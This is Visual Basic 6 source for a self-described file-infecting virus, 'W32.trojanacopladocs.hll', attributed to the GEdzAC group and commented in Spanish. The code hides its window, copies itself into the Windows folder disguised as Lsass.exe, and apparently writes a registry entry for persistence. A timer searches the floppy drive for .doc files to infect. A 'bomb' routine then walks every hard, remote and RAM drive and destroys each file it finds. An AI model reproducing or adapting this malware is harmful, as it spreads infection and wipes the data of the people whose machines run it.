VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   0  'None
   Caption         =   "Form1"
   ClientHeight    =   90
   ClientLeft      =   -7050
   ClientTop       =   3345
   ClientWidth     =   90
   ControlBox      =   0   'False
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   90
   ScaleWidth      =   90
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
   WhatsThisHelp   =   -1  'True
   Begin VB.Timer escribirenregistro 
      Left            =   4440
      Top             =   720
   End
   Begin VB.Timer Timer1 
      Left            =   4440
      Top             =   240
   End
   Begin VB.DriveListBox Drive1 
      Height          =   315
      Left            =   120
      TabIndex        =   2
      Top             =   240
      Width           =   2175
   End
   Begin VB.DirListBox Dir1 
      Height          =   1440
      Left            =   120
      TabIndex        =   1
      Top             =   600
      Width           =   2175
   End
   Begin VB.FileListBox File1 
      Height          =   1845
      Hidden          =   -1  'True
      Left            =   2400
      TabIndex        =   0
      Top             =   240
      Width           =   1935
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Nombre: W32.trojanacopladocs.hll
'Autor: Morusa
'Origen: México, ...
'Corporacion: MLHR Corporation & Grupo GEdzAC
'S.O.:95,98,NT,2000,Me,Xp
'Descripción: Se adjunta a archivos ".doc" y espera
'a su correspondiente ejeqción para seguir infectando

'Terminado el 31 de diciembre del 2003
Public kehago As Byte

Private Sub escribirenregistro_Timer()
 Call crearcadena(agregardiagonal(App.Path, App.EXEName & ".exe"))
End Sub

Private Sub Form_Load()
Call generarfsoyws
Call obtenerfoders
Call crearcadena(dirwin & "\Lsass.exe")

Dir1.Path = "C:\"
App.TaskVisible = False

If LCase(dirwin) <> LCase(App.Path) Then
 If existeGeDzaCmlh <> True Then
  Call copiarmeadirwin
 End If
Else
  escribirenregistro.Interval = 100
  Call existeGeDzaCmlh
End If
End Sub
Private Sub Dir1_Change()
File1.Path = Dir1.Path
End Sub
Private Sub Drive1_Change()
Dir1.Path = Mid(Drive1.Drive, 1, 2) & "\"
'le asigno la unidad al drive1
End Sub
Public Sub buscar(tipo As String)
File1.Pattern = tipo
Call buscar1
Call buscar2
End Sub
Sub buscar1()
Dim i As Integer
Dim archivos As Integer
archivos = File1.ListCount - 1
 
For i = 0 To archivos
  chkrarchivo File1.List(i)
  DoEvents
Next

End Sub
Sub buscar2()
Dim i, j As Integer
Dim archivos As Integer
Dim carpetas As Integer

carpetas = Dir1.ListCount - 1

For i = 0 To carpetas
 DoEvents
 Dir1.Path = Dir1.List(i)
 archivos = File1.ListCount - 1
 For j = 0 To archivos
  chkrarchivo File1.List(j)
  DoEvents
 Next
 buscar2
Next
Call subirnivel
End Sub
Sub chkrarchivo(archivo As String)
Select Case kehago
Case 0: 'infectar 3 archivos
    Call infectar(Dir1.Path, archivo)
Case 1: 'dejar bomba
    Call anikilararchivo(archivo)
End Select
End Sub
Sub subirnivel()
Dir1.Path = a.getparentfoldername(Dir1.Path)
End Sub

Private Sub Timer1_Timer()
Static i As Integer
On Error GoTo err:
tiempo = tiempo + 1
Open dirsys & "\GeDzaC.mlh" For Output As #1
Write #1, tiempo
Close #1
''''''''''''''''''''''''
If i >= 4 Then
 i = 0
 kehago = 0
 Dir1.Path = "a:\"
 File1.Refresh
 Call buscar("*.doc")
Else
 i = i + 1
End If

err:
End Sub
Function existeGeDzaCmlh() As Boolean
On Error GoTo error:
Call chkrexeparaborrar
Open dirsys & "\GeDzaC.mlh" For Input As #1
Input #1, tiempo
Close #1
Exit Function
existeGeDzaCmlh = True
error:
End Function
Sub chkrexeparaborrar()
Dim borrar As String
Dim resp  As Byte
Dim i As Integer

On Error GoTo err:
 Open dirwin & "\readmer.cls" For Input As #4
  Input #4, borrar
 Close #4
 Kill dirwin & "\readmer.cls"

 While resp = 0
  DoEvents
  resp = borrararch(borrar)
  i = i + 1
  If i >= 3000 Then
   resp = 1
  End If
 Wend
 
err:
 Timer1.Interval = 60000
End Sub
Function borrararch(dir As String) As Byte
On Error GoTo err:
 DoEvents
 Kill dir
 borrararch = 1
Exit Function
err:
 borrararch = 0
End Function

Public Sub unidadesdedisco()
'este procedimiento chk ke tipo son las unidades
'y solo las de almacenamiento son elegidas según lo ke se
'rekiera hacer

Dim unidades As Integer
'a uni le asigno el valor de las unidades ke hay

On Error Resume Next
'aki se las asigno cuantas hay
unidades = Drive1.ListCount - 1
'minetras ke no termine de anikilar las unidades
'hace lo siguiente
Do While unidades <> 0
 DoEvents 'para ke pueda ejecutar otros procesos el SO
 kehago = 1
'obtenereltipodedrive obtengo de ke tipo es con lo de arriba
 Select Case obtenereltipodedrive(Drive1.List(unidades))
  Case 1, 4, 6: 'particion ,remotedisk o ramdisk
    Drive1.Drive = Drive1.List(unidades) & "\" 'kambio la unidad
    buscar ("*.*") 'le digo ke buske en esa unidad
    
  Case 3: 'kso disko duro
    Drive1.Drive = Drive1.List(unidades)
    Dir1.Path = Drive1.Drive & "\"
    buscar ("*.*")
 End Select
 unidades = unidades - 1 'le voy restando para ke vaya chekndo las
            'unidades
Loop


End Sub
